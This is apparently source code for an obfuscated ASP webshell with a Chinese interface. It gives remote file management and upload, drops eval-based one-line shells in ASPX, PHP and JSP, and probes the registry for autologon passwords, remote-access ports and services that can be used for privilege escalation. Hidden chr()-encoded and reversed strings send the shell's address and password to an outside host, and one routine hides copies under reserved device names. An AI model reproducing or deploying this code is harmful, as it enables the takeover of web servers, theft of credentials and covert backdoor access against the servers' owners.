xpsa╁&)26(rhc&╁╁&)73(rhc&╁;))╁╁efasnu╁╁,]╁╁w╁╁[metI.tseuqeR(lave(etirW.esnopseR╁&)73(rhc&╁╁&)06(rhc&╁╁&)26(rhc&╁╁&)73(rhc&╁ ╁╁eslaf╁╁=tseuqeRetadilav ╁╁tpircsJ╁╁=egaugnaL egaP @%╁&)06(rhc&╁╁etirW.))╁xpsa.tset╁(htappam.revres(eliFtxeTetaerC.osf╋╁oo∩_∩oo tseT psJ╁etirW.))╁psj.tset╁(htappam.revres(eliFtxeTetaerC.osf╋╁>?)(ofniphp php?<>?'oo∩_∩oo' ohce PHP?<╁etirW.))╁php.tset╁(htappam.revres(eliFtxeTetaerC.osf╋))0,0(tBo(tcejbOetaerC.revreS=osf tes╋txeN emuseR rorrE nO╋"))
End function

On Error Resume Next
function apjdel():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):j"删除完毕!":End function

Dim T1
Class UPC
  Dim D1,D2
  Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function

  Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(ObT(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1 = CreateObject(ObT(6,0))
T1.Type = 1 : T1.Mode =3 : T1.Open
T1.Write  Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart = 1
DEnd = LenB(TDa)
set D2=CreateObject(ObT(4,0))
vbCrlf = chrB(13) & chrB(10)
set T2 = CreateObject(ObT(6,0))
TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen = LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
  DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
  T2.Type = 1 : T2.Mode =3 : T2.Open
  T1.Position = DStart
  T1.CopyTo T2,DIEnd-DStart
  T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
  TIn = T2.ReadText : T2.Close
  DStart = InStrB(DIEnd,TDa,TSt)
  FStart = InStr(22,TIn,"name=""",1)+6
  FEnd = InStr(FStart,TIn,"""",1)
  UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
  if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart = InStr(FEnd,TIn,"filename=""",1)+10
FEnd = InStr(FStart,TIn,"""",1)
FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd = InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize = DStart -DIEnd -3
if not D2.Exists(UpName) then
  D2.add UpName,TFL
end if
  else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position = 0 : T2.Type = 2
T2.Charset ="gb2312"
SFV = T2.ReadText
T2.Close
if D1.Exists(UpName) then
  D1(UpName)=D1(UpName)&", "&SFV
else
  D1.Add UpName,SFV
end if
  end if
  DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
  End Sub
  Private Sub Class_Terminate
if Request.TotalBytes>0 then
  D1.RemoveAll:D2.RemoveAll
  set D1=nothing:set D2=nothing
  T1.Close:set T1 =nothing
end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
 T3.Mode=3 : T3.Type=1 : T3.Open
 T1.position=FileStart
 T1.copyto T3,FileSize
 T3.SaveToFile F,2
 T3.Close
 set T3=nothing
 SaveAs=false
end function
End Class
Class LBF
  Dim CF
  Private Sub Class_Initialize
SET CF=CreateObject(ObT(0,0))
  End Sub
  Private Sub Class_Terminate
Set CF=Nothing
  End Sub
Function ShowDriver()
For Each D in CF.Drives
  j cdx&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>&nbsp本地磁盘 ("&D.DriveLetter&":)</a><br></td></tr>" 
Next
  End Function
Function IsIco(ia,ib,ta)
	If ShowFileIco=true Then
      IsIco = " <img src='"&IcoPath&ia&"'> "
	  If ib<>"" Then
	  IsIco = "<img src='"&IcoPath&ib&"'> "
	  End If
	Else
	  IsIco = "&nbsp;<font face='wingdings' color='#dddddd' size='6'>"&ta&"</font>  "
	End If
End Function
Function FileIco(FName)
  If ShowFileIco=true Then
    TypeList =  ".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml.zip.jsp.aspx.;"
    FileType = lcase(Mid(FName, InstrRev(FName,".")+1))
    If Instr(TypeList,"."&FileType)>0 then
      Ico = FileType&".gif"
    Else
      Ico = "default.gif"
    End If

    FileIco = "<img src='"&IcoPath&Ico&"' border='0'> "
  Else 
    FileIco="<font face='wingdings' color='#dddddd' size='3'>2</font> "
  End If
End Function
Function Show1File(Path) 
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>" 
For Each F in FOLD.subfolders
SI=SI&"<td height=10 width=17% align=center><div style='border:1px solid #383838;padding-bottom:4px'>"
SI=SI&IsIco("","folder.gif","0")
si=si&"<a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""进入""><br>"&F.Name&"</a><br><a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")' onclick='return yesok()' class='am' title='删除'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")' onclick='return yesok()' class='am' title='移动'>Move</a> </div></td>"
i=i+1
If i mod 6=0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr></table>"
j SI &"" : SI="":i=0
SI="<table width='100%' align=center><tr><td id=s><b id=x>Filename</b></td><td id=s height=22><b id=x>Size</b></td><td id=s><b id=x>Type</b></td><td id=s><b id=x>Operating</b></td><td id=s><b id=x>Last Modified</b></td><td></td>"
For Each L in Fold.files
SI=SI&"<tr><td height='20' id=d onMouseOver=""this.style.backgroundColor='#696969'"" onMouseOut=""this.style.backgroundColor='#121212'"">"
si=si&FileIco(L.Name)
si=si&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='下载'>  "&L.Name&"</a><Td id=d>"&clng(L.size/1024)&"K</td><Td id=d>"&L.Type&"</td><Td id=d>"
si=si&"<a href="""&openUrl(PaTh&"\"&L.nAme)&""" class='am' title='Open'>Open</a> "
si=si&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
Si=Si&"<a onclick=""window.open('?Action=EditPower&PowerPath="&RepAth(PaTh&"\"&L.nAme)&"','EditPower','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=300,height=200')"" href='###' class='am' title='权限'>权限</a>"
Dim EditOOK
EditOOK=1
EditOOV=l.Attributes
If EditOOV >= 128 Then
EditOOV = EditOOV - 128
End If
If EditOOV >= 64 Then
EditOOV = EditOOV - 64
End If
If EditOOV >= 32 Then
EditOOV = EditOOV - 32
End If
If EditOOV >= 16 Then
EditOOV = EditOOV - 16
End If:If EditOOV >= 8 Then
EditOOV = EditOOV - 8
End If
If EditOOV >= 4 Then
EditOOV = EditOOV - 4:EditOOK=0
End If
If EditOOV >= 2 Then
EditOOV = EditOOV - 2:EditOOK=0
End If
If EditOOV >= 1 Then
EditOOV = EditOOV - 1:EditOOK=0
End If
if EditOOK=0 then
si=si&"<font face='webdings' size='1' color=red>x</font>"
else
si=si&"√"
end if
si=si&" <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='移动'>Move</a></td><td id=d>"&replace(L.DateLastModified,"/","-")&"</td></tr>"
i=i+1
Next
j SI&"</tr></table>":execute(shisanfun("fi dne:fi dne:fi dne:1+)╁cevres╁(noisses=)╁cevres╁(noisses neht ╁╁><noitcA fi:esle:╁>tpircs<>'╁&ssaPresU&╁=p&╁&urevres&╁╁&nufE j:1+)╁cevres╁(noisses=)╁cevres╁(noisses:neht 1=)╁cevres╁(noisses fi:esle:neht  0><)╁.861.291╁,urevreS(rtsnI ro 0><)╁1.0.0.721╁,urevreS(rtsnI fi"))
Set FOLD=Nothing
End function
Function DelFile(Path)
If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>恭喜您文件 "&Path&" 删除成功！</center>"
SI=SI&BackUrl
j SI
End If
End Function
Function EditFile(Path)
If Request("Action2")="Post" Then
Set T=CF.CreateTextFile(Path)
T.WriteLine Request.form("content")
T.close
Set T=nothing
SI="<center><br><br><br>恭喜您文件保存成功！</center>"
SI=SI&BackUrl
j SI
j ""&copyurl&""
Response.End
End If
If Path<>"" Then
Set T=CF.opentextfile(Path, 1, False)
Txt=HTMLEncode(T.readall) 
T.close
Set T=Nothing
Else
Path=Session("FolderPath")&"\shell.asp":Txt=strBAD
End If
j "<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'><input name='Action' value='EditFile' Type='hidden'><input name='FName' value='"&Path&"' style='width:100%'><br><textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br><hr><input name='goback' type='button' value='Back' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='Reset'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='Save'></form>"
End Function
Function CopyFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.CopyFile Path(0),Path(1)
SI="<center><br><br><br>恭喜您文件"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
j SI 
End If
End Function
Function MoveFile(Path)
Path=Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.MoveFile Path(0),Path(1)
SI="<center><br><br><br>恭喜您文件"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
j SI 
End If
End Function
Function DelFolder(Path)
If CF.FolderExists(Path) Then
CF.DeleteFolder Path
SI="<center><br><br><br>恭喜您目录"&Path&"删除成功！</center>"
SI=SI&BackUrl
j SI
End If
End Function
Function CopyFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.CopyFolder Path(0),Path(1)
SI="<center><br><br><br>恭喜您目录"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
j SI
End If
End Function
Function MoveFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.MoveFolder Path(0),Path(1)
SI="<center><br><br><br>恭喜您目录"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
j SI
End If
End Function
Function NewFolder(Path)
execute(shisanfun("fI dnE╋IS j╋lrUkcaB&IS=IS╋╁>retnec/<！功成建新╁&htaP&╁录目您喜恭>rb<>rb<>rb<>retnec<╁=IS╋htaP redloFetaerC.FC╋nehT ╁╁><htaP dna )htaP(stsixEredloF.FC toN fI"))
End Function
End Class

execute(shisanfun("buS dnE╋fi dnE╋╁码密erehwynAcp到得解破并载下录目认默从以可,件文码密erehwynAcp_现发>il<╁j╋nehT )╁fic.╁&emanrevres&╁\cetnamyS\ataD noitacilppA\sresU llA\sgnitteS dnA stnemucoD\╁&revirdsys(stsixEeliF.osf fI╋)╁emaNretupmoC\emaNretupmoC\emaNretupmoC\lortnoC\teSlortnoCtnerruC\METSYS\MLKH╁(daeRgeR.hsw=emanrevres╋)2,)2(redloFlaicepsteG.osF(tfel=evirdsyS╋)╁tcejbOmetsySeliF.gnitpircS╁(tcejboetaerC.revreS=osf teS╋txeN╋fi dnE╋fi dnE╋╁>rb<马木PHP入写且并,录目liaMbeW找查以可,动启限权metsySlacoL以且,liamniW cigaM_有中器务服>il<╁j╋nehT ╁metsySlacoL╁=emaNtnuoccAecivreS.ecivreSjbo fi╋nehT )╁liamniw╁,)emaN.ecivreSjbo(esacl(rtsni fi╋fi dnE╋fi dnE╋╁>rb<权提马木psJ用使虑考以可,动启限权metsySlacoL以且,tacmoT_有中器务服>il<╁j╋nehT ╁metsySlacoL╁=emaNtnuoccAecivreS.ecivreSjbo fi╋nehT )╁tacmot╁,)emaN.ecivreSjbo(esacl(rtsni fi╋fi dnE╋fi dne╋fi dnE╋╁>rb<马木PHP虑考以可,metsySlacoL为限权动启,在存务服ehcapA_有中器务服>il< ╁j╋eslE╋╁>rb<权提接直以可.ehcapA为器务服BEW前当>il<╁j╋nehT )╁ehcapA╁,)╁ERAWTFOS_REVRES╁(selbairaVrevreS.tseuqeR(rtsni fI╋nehT ╁metsySlacoL╁=emaNtnuoccAecivreS.ecivreSjbo fi╋nehT ╁ehcapa╁=)emaN.ecivreSjbo(esacl fi╋fi dnE╋fi dnE╋╁>rb<权提具工exe.us用虑考以可,动启限权metsySlacoL以且,装安U-vreS_有中器务服>il<╁j╋nehT ╁metsySlacoL╁=emaNtnuoccAecivreS.ecivreSjbo fi╋nehT ╁U-vreS╁=emaN.ecivreSjbo fi╋retupmoCjbo nI ecivreSjbo hcaE roF╋txeN emuseR rorrE nO╋)╁ecivreS╁(yarrA = retliF.retupmoCjbo╋)╁noitacilppA.llehS╁(tcejbOetaerC.revreS = as teS╋)╁.//:TNniW╁(tcejbOteG = retupmoCjbo teS╋╁>rh<>rb<]测探点_弱器务服[╁j╋╁>rb<>rb<>rb<------------------------------------╁j╋╁>rb<╁&kk&╁:为卡网_动活前当>il<╁j╋)kh(daeRgeR.hsw=kk╋╁tnuoC\munE\pipcT\secivreS\100teSlortnoC\METSYS\MLKH╁=kh╋╁>rb<╁&lmtn&╁:为置设lmtN tenleT>il<╁j╋1=lmtN nehT ╁╁=lmtn fi╋)yekLMTN(daeRgeR.hsW=lmtn╋╁LMTN\0.1\revreStenleT\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH╁=yekLMTN╋╁>rb<╁&ylpsid&╁:户用入登次_上示显否是>il<╁j╋╁否╁=ylpsid esle ╁是╁=ylpsid nehT 0=nigolpsid ro ╁╁=nigolpsid fI╋)╁emaNresUtsaLyalpsiDtnoD\metsyS\seiciloP\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH╁(daeRger.hsw=nigolpsid╋fi dnE╋╁>tnof/<>rb<╁&dwssaP&╁:码密>der=roloc tnof<>erauqs=epyt il<╁j╋╁>rb<╁&nimdA&╁:名户用>erauqs=epyt il<╁j╋)╁drowssaPtluafeD\nogolniW\noisreVtnerruC\TN swodniW\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH╁(daeRgeR.hsW=dwssaP╋)╁emaNresUtluafeD\nogolniW\noisreVtnerruC\TN swodniW\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH╁(daeRgeR.hsW=nimdA╋╁>rb<用启:入登动_自户用>il<╁j╋eslE╋╁>rb<用启未:入登动_自户用>il<╁j╋nehT ╁╁=nigolotuA ro 0=nigolotuA fi╋)nigolotuAsi(daeRgeR.hsW=nigolotuA╋╁nogoLnimdAotuA\nogolniW\noisreVtnerruC\TN swodniW\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH╁=nigolotuAsi╋╁>tnof/<>rb<╁&emaNnimdA&╁>der=roloc tnof<:为名户用员╁&╁理管认默>il<╁j╋╋fi dne╋╁krowteN.tpircsW:啊行不的奶奶他╁j╋neht rre fi╋txeN╋╁>il/<>tnof/<>rb<╁&emaN.nimda&╁：组员理管前当>der=roloc tnof<>il<╁ j╋srebmeM.puorGjbo ni nimda hcaE roF╋)╁puorg,srotartsinimdA/╁&emaNretupmoC.Nt&╁//:TNniW╁(tcejbOteG=puorGjbo teS╋)╁krowteN.tpircsW╁(tcejbOetaerc.revres=Nt teS╋ txen emuser rorre no╋0=seripxE.esnopseR╋╁rotartsinimdA╁=emaNnimdA nehT ╁╁=emannimda fi╋)yeKemaNnimdA(daeRgeR.hsw=emaNnimdA╋╁emaNresUtluafeDtlA\nogolniW\noisreVtnerruC\TN swodniW\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH╁=yeKemaNnimdA╋╁>rb<╁&emancp&╁:为名机_主前当>il<╁j╋╁>rb<.名机主取_读法无╁=emancp nehT ╁╁=emancp fi╋)yekemancp(daeRgeR.hsw=emancp╋╁emaNretupmoC\emaNretupmoC\emaNretupmoC\lortnoC\teSlortnoCtnerruC\METSYS\MLKH╁=yekemancp╋╁>1=ezis rh<>rb<]测探_置设统系[>rb<>rb<╁j╋txen╋╁>rb<╁&)i(shtap&╁>il<╁j╋)shtap(dnuobU ot )shtap(dnuobL=i roF╋╁>rb<:量变径路_前当统系╁j╋╁>rb<------------------------------------╁j╋)╁;╁,htaPtfoS(tilps=shtap╋╁>rb<持支:_件软毒杀列系星瑞>il<╁j nehT )╁gnisir╁,ofnihtaP(rtsni fi╋╁>rb<持支:_件软毒杀克铁门赛>il<╁j nehT )╁surivitna╁,ofnihtaP(rtsni fi╋╁>rb<持支:_件软毒杀列系山金 >il<╁j nehT )╁vak╁,ofnihtaP(rtsni fi╋╁>rb<持支:_件软毒杀lliK>il<╁j nehT )╁lliK╁,ofnihtaP(rtsni fi╋╁>rb<持支:_制控erehwynAcP克铁门赛>il<╁j nehT )╁erehwynacp╁,ofnihtaP(rtsni fi╋╁>rb<持支:_器务服MFC>il<╁j nehT )╁7xmnoisufc╁,ofnihtaP(rtsni fi╋╁>rb<持支:_务服库据数elcarO>il<╁j nehT )╁elcaro╁,ofnihtaP(rtsni fi╋╁>rb<持支:_务服库据数LQSyM>il<╁j nehT )╁lqsym╁,ofnihtaP(rtsni fi╋╁>rb<持支:_务服库据数LQSSM>il<╁j nehT )╁revres lqs tfosorcim╁,ofnihtaP(rtsni fi╋╁>rb<持支:_本脚avaJ>il<╁j nehT )╁avaj╁,ofnihtaP(rtsni fi╋╁>rb<持支:_本脚lreP>il<╁j nehT )╁lrep╁,ofnihtaP(rtsnI fi╋╁:持支件╁&╁软统系╁j╋)htaPtfoS(esacl=ofnihtaP╋)╁htaP╁(meti.tnemnorivnE.hsW=htaPtfoS╋╁>1=ezis rh<>rb<]测探件_软统系[>rb<>rb<>rb<╁j╋╁>lo/<╁j╋fI dnE╋╁>rb<╁ & drowssaPnigoLotua & ╁ :码密户帐的╁&╁录登动自╁j╋fI dnE╋╁eslaF╁j╋raelC.rrE╋nehT rrE fI╋)yeKssaPnigoLotua & htaPnigoLotua(daeRgeR.Xsw = drowssaPnigoLotua╋╁>rb<╁ & emanresUnigoLotua & ╁ :户帐统系的╁&╁录登动自╁j╋)yeKresUnigoLotua & htaPnigoLotua(daeRgeR.Xsw = emanresUnigoLotua╋eslE╋nehT 0 = elbanEnigoLotuAsi fI╋)yeKelbanEnigoLotua & htaPnigoLotua(daeRgeR.Xsw = elbanEnigoLotuAsi╋╁drowssaPtluafeD╁ = yeKssaPnigoLotua╋╁emaNresUtluafeD╁ = yeKresUnigoLotua╋╁nogoLnimdAotuA╁ = yeKelbanEnigoLotua╋╁\nogolniW\noisreVtnerruC\TN swodniW\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH╁ = htaPnigoLotua╋fI dnE╋╁>/rb<╁ & troPmret & ╁ :口端╁&╁务服端终前当╁j╋eslE ╋╁>/rb<.制限到受否是限权查检 ,口端端终到得法无╁j╋ nehT 0 >< rebmuN.rrE rO ╁╁ = troPmret fI╋╁>lo<录登动自及╁&╁口端务服_端终╁j╋)yeKtroPlanimret & htaPtroPlanimret(daeRgeR.Xsw = troPmret╋╁rebmuNtroP╁ = yeKtroPlanimret╋╁\pcT-PDR\snoitatSniW\revreS lanimreT\lortnoC\teSlortnoCtnerruC\METSYS\MLKH╁ = htaPtroPlanimret╋drowssaPnigoLotua ,emanresUnigoLotua ,yeKelbanEnigoLotua ,elbanEnigoLotuAsi miD╋yeKssaPnigoLotua ,yeKresUnigoLotua ,htaPnigoLotua miD╋troPmret ,yeKtroPlanimret ,htaPtroPlanimret miD╋)╁llehS.tpircSW╁(tcejbOetaerC.revreS = Xsw teS╋╁------------------------------------------------------╁j╋╁>rb<╁&troPWAP&╁:为口端erehwynAcP>il<╁j╋╁erehwynAcp装安否╁&╁是机主╁&╁认确请.取获╁&╁法无╁=troPWAP neht ╁╁=troPWAP fI╋)yeKerehwynAcp(daeRgeR.hsW=troPWAP╋╁troPataDPIPCT\metsyS\noisreVtnerruC\erehwynAcp\cetnamyS\ERAWTFOS\ENIHCAM_LACOL_YEKH╁=yeKerehwynAcp╋╁>tnof/<>rb<╁&troPmreT&╁>der=roloc tnof<:为口端ecivreS lanimreT>il<╁j╋╁机主本版revreS swodniW为否是╁&╁认确请.取读╁&╁法无╁=troPmreT nehT ╁╁=troPmreT fI╋)yeKmreT(daeRgeR.hsW=troPmreT╋╁rebmuNtroP\pct\sdT\dwpdr\sdW\revreS lanimreT\lortnoC\teSlortnoCtnerruC\METSYS\ENIHCAM_LACOL_YEKH╁=yeKmreT╋╁>rb<╁&troptnlT&╁:口╁&╁端tenleT>il<╁j╋╁)置设╁&╁认默(32╁=tnlT nehT ╁╁=troPtnlT fi╋)yeKtenleT(daeRgeR.hsW=troPtnlT╋╁troPtenleT\0.1\revreStenleT\tfosorciM \ERAWTFOS\ENIHCAM_LACOL_YEKH╁=yektenleT╋╁>1=ezis rh<>rb<]测探╁&╁口端╁&╁殊特[>rb<>rb<╁j╋fi dne╋txeN╋╁>rb<------------------------------------------------╁j╋fi dnE╋fi dnE╋╁>rb<╁j╋txen╋╁,╁&)j(wollaPDU j╋)wollapdu(dnuoBU oT )wollapdu(dnuoBL = j rof╋╁:为口端pdu的╁&╁许允>il<╁j╋eslE╋╁>rb<部全:为口端pdu的╁&╁许允>il<╁j╋nehT 0=)0(wollapdu ro ╁╁=)0(wollapdu fI╋)PDUlluF(daeRgeR.hsW=wollapdu╋fi dnE╋╁>rB<╁j╋txeN╋╁,╁&)j(wollapct j╋)wollapct(dnuoBU oT )wollapct(dnuoBL = j roF╋╁:为口端pct的╁&╁许允>il<╁j╋eslE╋╁>rb<部全:为口端pct的╁&╁许允>il<╁j╋nehT 0=)0(wollapct ro ╁╁=)0(wollapct fI╋)PCTlluF(daeRgeR.hsW=wollapct╋KUE&BdpA&htap=PDUlluF╋KTE&BdpA&htaP=PCTlluF╋╁stroPdewollAPDU\╁=KUE╋╁stroPdewollAPCT\╁=KTE╋esle╋╁>rb<选筛PI/pcT没>il<╁j╋ nehT 1=retlifpipctoN fi╋fI dnE╋╁>rb<置设有没或取读法无SND╁&╁认默>il<╁j╋eslE╋╁>rb<╁&rtsSND&╁:为SND╁&╁卡网>il<╁j╋nehT ╁╁><rtsSND fI╋)yeKSND(daeRgeR.hsW=rtsSND╋╁revreSemaN\╁&BdpA&htaP=yeKSND╋fi dnE╋╁>rb<置设有没或取读法无关网>il<╁j╋eslE╋txeN╋╁>rb<╁&)j(yawetaG&╁:╁&j&╁关网>il<╁j╋)yawetaG(dnuobU ot )yawetaG(dnuobL=j roF╋nehT )yaWetaG(yarrasi fI╋)yeKyaWetaG(daergeR.hsW=yaWetaG╋╁yawetaGtluafeD\╁&BdpA&htaP=yeKyaWetaG╋fi dnE╋╁>rb<置设有没或╁&╁取读法无址╁&╁地PI>il<╁j╋eslE╋txeN╋╁>rb<╁&)j(rddAPI&╁:为╁&j&╁址╁&╁地PI>il<╁j╋)rddAPI(dnuobU ot )rddAPI(dnuobL=j roF╋nehT ╁╁><)0(rddaPI fI╋)yeKPI(daergeR.hsW=rddaPI╋╁sserddAPI\╁&BdpA&htaP=yeKPI╋╁\secafretnI\sretemaraP\pipcT\secivreS\100teSlortnoC\METSYS\ENIHCAM_LACOL_YEKH╁=htaP╋╁>rb<╁&BdpA&╁:为列序的╁&i&╁卡网╁j╋)╁╁,╁\eciveD\╁,)i(sdpA(ecalpeR=BdpA╋1-)sdpA(dnuoBU oT )sdpA(dnuoBL=i roF╋ nehT )sdpA(yarrAsI fI╋)yeKdpA(daeRgeR.hsW=sdpA╋╁dniB\egakniL\pipcT\secivreS\100teSlortnoC\METSYS\MLKH╁=yeKdpA╋fI dnE╋1=retlifpipctoN╋nehT ╁╁=elbanEsi ro 0=elbanEsi fI╋)yeKpipcTelbanE(daergeR.hsW=elbanEsi╋╁sretliFytiruceSelbanE\sretemaraP\pipcT\secivreS\teSlortnoCtnerruc\METSYS\MLKH╁=yeKPIPCTelbanE╋╁>1=ezis rh<>rb<]测探╁&╁络网[╁j╋)╁llehS.tpircsW╁(tcejboetaerc=hsw tes╋hsw mid╋txen emuser rorre no╋)(ofnIlanimreTteg bus"))
copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39)&chr(104)&chr(116)&chr(116)&chr(112)&chr(58)&chr(47)&chr(47)&chr(111)&chr(100)&chr(97)&chr(121)&chr(101)&chr(120)&chr(112)&chr(46)&chr(99)&chr(111)&chr(109)&chr(47)&chr(115)&chr(120)&chr(47)&chr(115)&chr(46)&chr(97)&chr(115)&chr(112)&chr(63)&chr(115)&chr(61)&uu&chr(38)&chr(112)&chr(61)&pp&chr(39)&chr(62)&chr(60)&chr(47)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(62)&chr(13)&chr(10)
execute(shisanfun("bus dne╋╁>tpircs/<;'1emanelif&psa./segami/=emanF?╁&lru&)╁eman_revres╁(tseuqer&╁//:ptth'=noitacol.tnerap>tpircs<╁ j╋gnihton=osf tes╋1emanelif&╁.╁&xepdnr&╁\╁&1htapelif&╁\.\\╁,htapf elifypoc.osf╋1emanelif&╁.╁&xepdnr&))╁/╁,lru(verrtsni,lru(tfel=lru╋)╁lru╁(selbairavrevres.tseuqer=lru╋))╁\╁,htapf(verrtsni-)htapf(nel,htapf(thgir=1emanelif╋)╁.╁(htappam.revres=1htapelif╋╁╁=)╁wjles╁(noisses╋))71,0(rebmundnr()╁|╁,xep(tilps=xepdnr╋╁9tpl|8tpl|7tpl|6tpl|5tpl|4tpl|3tpl|2tpl|1tpl|9moc|8moc|7moc|6moc|5moc|4moc|3moc|2moc|1moc╁=xep╋)╁tcejbometsyselif.gnitpircs╁(tcejboetaerc.revres=osf tes╋)╁detalsnart_htap╁(selbairavrevres.tseuqer=htapf╋llehsneddih bus"))
Sub Message(state,msg,flag)
j"<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#ddd> <TR></TR><TR><TD align=middle bgcolor=#ecfccd><TABLE width=82% border=0 cellpadding=5 cellspacing=0><TR><TD><FONT color=red>"
j state
j"</FONT></TD><TR><TD><P>"&msg
j"</P></TD></TR></TABLE></TD></TR><TR><TD class=TBEnd>"
If flag=0 Then
j" <INPUT type=button value=关闭 onclick='window.close();'>"
Else
End if
j"</TD></TR></TABLE>"
End Sub
Function Red(str)
Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function

Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function


Sub ScanDriveForm()
Dim FSO,DriveB
Set FSO = Server.Createobject("Scripting.FileSystemObject")
j"<br><TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#ffffff><TR><TD colspan=5 class=TBHead>磁盘/系统文件夹信息</TD></TR>"
  For Each DriveB in FSO.Drives
j" <TR align=middle class=TBTD><FORM action=?Action=ScanDrive&Drive="
j DriveB.DriveLetter
j" method=Post><TD width=25"&chr(37)&"><B>盘符</B></TD><TD width=15"&chr(37)&">"
j DriveB.DriveLetter
j":</TD><TD width=20"&chr(37)&"><B>类型</B></TD><TD width=20"&chr(37)&">"
  Select Case DriveB.DriveType
  Case 1: j"可移动"
  Case 2: j"本地硬盘"
  Case 3: j"网络磁盘"
  Case 4: j"CD-ROM"
  Case 5: j"RAM磁盘"
  Case else: j"未知类型"
  End Select
j"</TD><TD><INPUT type=submit value=详细报告></TD></FORM></TR>"
  Next
j" <TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(0)
j" method=Post><TD align=middle><B>Windows文件夹</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(0)
j"</TD><TD align=middle><INPUT type=submit value=详细报告></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(1)
j" method=Post><TD align=middle><B>System32文件夹</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(1)
j"</TD><TD align=middle><INPUT type=submit value=详细报告></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(2)
j" method=Post><TD align=middle><B>系统临时文件夹</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(2)
j"</TD><TD align=middle><INPUT type=submit value=详细报告></TD><TR class=TBTD> <FORM action= method=Post>"
